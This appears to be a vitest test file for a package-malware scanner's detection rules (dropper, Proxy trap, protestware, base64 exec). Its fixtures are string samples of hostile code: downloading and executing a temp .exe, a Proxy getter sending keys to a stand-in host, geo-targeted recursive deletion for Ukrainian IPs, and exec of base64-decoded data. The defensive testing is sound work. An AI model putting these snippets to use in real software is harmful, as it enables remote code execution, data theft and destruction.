import { describe, expect, it } from "vitest";
import {
  CAMPAIGN_PATTERNS_V2,
  INFOSTEALER_PATTERNS,
  OBFUSCATION_PATTERNS_V2,
  PYPI_FILE_PATTERNS,
  isPatternApplicableToFile,
  matchPatternInContent,
} from "../patterns.js";
import type { PatternEntry } from "../types.js";

const rule = (patterns: PatternEntry[], id: string): PatternEntry => {
  const found = patterns.find((entry) => entry.rule === id);
  if (!found) throw new Error(`Missing test rule: ${id}`);
  return found;
};

const dropper = rule(INFOSTEALER_PATTERNS, "DROPPER_TEMP_EXEC");
const proxy = rule(OBFUSCATION_PATTERNS_V2, "PROXY_HANDLER_TRAP");
const protestware = rule(CAMPAIGN_PATTERNS_V2, "PROTESTWARE_IP_GEO_V2");
const pythonB64Exec = rule(PYPI_FILE_PATTERNS, "PYPI_B64_EXEC_COMBINED");

const hits = (entry: PatternEntry, source: string) => {
  if (!isPatternApplicableToFile(entry, source)) return [];
  return matchPatternInContent(entry, source, "g");
};

describe("v5.23.1 multi-line rule precision", () => {
  describe("DROPPER_TEMP_EXEC", () => {
    it.each(["execSync", "execFileSync"])(
      "does not treat the .exe prefix of .%s as a written executable",
      (executionMethod) => {
        const source = `const https = require("https");
const fs = require("fs");
const child_process = require("child_process");
https.get(binaryUrl, downloadPlatformBinary);
fs.writeFileSync(path.join(installDir, "package.json"), "{}");
child_process.${executionMethod}("node --version");
`;
        expect(hits(dropper, source)).toEqual([]);
      },
    );

    it("requires the written and executed path variables to agree", () => {
      const source = `const payload = await fetch(url).then((r) => r.arrayBuffer());
const written = os.tmpdir() + "/payload.exe";
const executed = os.tmpdir() + "/helper.exe";
fs.writeFileSync(written, Buffer.from(payload));
child_process.execSync(executed);
`;
      expect(hits(dropper, source)).toEqual([]);
    });

    it.each([
      [
        "one line with a repeated executable path",
        `const p = fetch(url); fs.writeFileSync(os.tmpdir() + "/payload.exe", p); child_process.execSync(os.tmpdir() + "/payload.exe");`,
      ],
      [
        "multiple lines with one path variable",
        `const payload = await fetch(url).then((r) => r.arrayBuffer());
const destination = os.tmpdir() + "/payload.exe";
fs.writeFileSync(destination, Buffer.from(payload));
child_process.execSync(destination);
`,
      ],
    ])("detects a real dropper on %s", (_name, source) => {
      expect(hits(dropper, source).length).toBeGreaterThan(0);
    });
  });

  describe("PROXY_HANDLER_TRAP", () => {
    it("does not borrow an unrelated fetch elsewhere in the file", () => {
      const source = `const store = new Proxy(target, {
  get: (obj, key) => obj[key],
});
fetch("/ordinary-api-call");
`;
      expect(hits(proxy, source)).toEqual([]);
    });

    it("continues after an earlier Proxy whose handler is not an object literal", () => {
      const source = `const ordinary = new Proxy(target, sharedHandler);
const hostile = new Proxy(target, {
  get: (obj, key) => { fetch(key); return obj[key]; },
});`;
      expect(hits(proxy, source).length).toBeGreaterThan(0);
    });

    it("detects executable template interpolation inside a trap", () => {
      const source = "const p = new Proxy(target, { get: (obj, key) => `${fetch(key)}` });";
      expect(hits(proxy, source).length).toBeGreaterThan(0);
    });

    it("does not treat hostile-looking string text as trap execution", () => {
      const source = `const p = new Proxy(target, {
  get: () => "fetch(secret)",
});`;
      expect(hits(proxy, source)).toEqual([]);
    });
    it.each([
      [
        "one line",
        `const p = new Proxy(target, { get: (obj, key) => { fetch("https://x.invalid/" + key); return obj[key]; } });`,
      ],
      [
        "multiple lines",
        `const p = new Proxy(target, {
  get: (obj, key) => {
    fetch("https://x.invalid/" + key);
    return obj[key];
  },
});`,
      ],
    ])("detects hostile behavior inside a trap on %s", (_name, source) => {
      expect(hits(proxy, source).length).toBeGreaterThan(0);
    });
  });

  describe("PROTESTWARE_IP_GEO_V2", () => {
    it("does not flag normal GeoIP database archive cleanup", () => {
      const source = `const maxmind = require("maxmind");
const tempArchive = await downloadDatabase();
await extract(tempArchive, databaseDirectory);
const reader = await maxmind.open(databasePath);
validate(reader);
fs.unlinkSync(tempArchive);
`;
      expect(hits(protestware, source)).toEqual([]);
    });

    it.each([
      [
        "one line",
        `const geo = require("geoip-lite"); if (geo.lookup(ip).country === "UA") fs.unlinkSync("/data");`,
      ],
      [
        "multiple lines",
        `const maxmind = require("maxmind");
const country = (await maxmind.open(database)).get(ip).country.iso_code;
if (country === "UA") {
  fs.rmSync(process.cwd(), { recursive: true, force: true });
}`,
      ],
    ])("detects geo-targeted destructive behavior on %s", (_name, source) => {
      expect(hits(protestware, source).length).toBeGreaterThan(0);
    });
  });

  describe("PYPI_B64_EXEC_COMBINED", () => {
    it.each([
      [
        "a defensive comment using the word exec",
        `payload = base64.b64decode(blob)
# Never pass decoded input to exec
return payload`,
      ],
      [
        "a commented-out exec call",
        `payload = base64.b64decode(blob)
# exec(payload)`,
      ],
      [
        "an exec-shaped string",
        `payload = base64.b64decode(blob)
message = "exec(payload)"`,
      ],
      [
        "an exec call for a different value",
        `payload = base64.b64decode(blob)
exec(trusted_bootstrap)`,
      ],
    ])("does not correlate decoded data with %s", (_name, source) => {
      expect(hits(pythonB64Exec, source)).toEqual([]);
    });

    it("retains a viable decoded path across a non-executing conditional assignment", () => {
      const source = `payload = base64.b64decode(blob)
if False:
  payload = trusted
exec(payload)`;
      expect(pythonB64Exec.spansLines).toBe(4);
      expect(hits(pythonB64Exec, source).length).toBeGreaterThan(0);
    });
    it.each([
      [
        "a nested call",
        `exec(base64.b64decode(blob))`,
      ],
      [
        "an assigned value on the same line",
        `payload = base64.b64decode(blob); exec(payload)`,
      ],
      [
        "an assigned value on a later line",
        `payload = base64.b64decode(blob)
verify_header(payload)
exec(payload)`,
      ],
    ])("detects actual execution of decoded data in %s", (_name, source) => {
      expect(hits(pythonB64Exec, source).length).toBeGreaterThan(0);
    });
  });
});
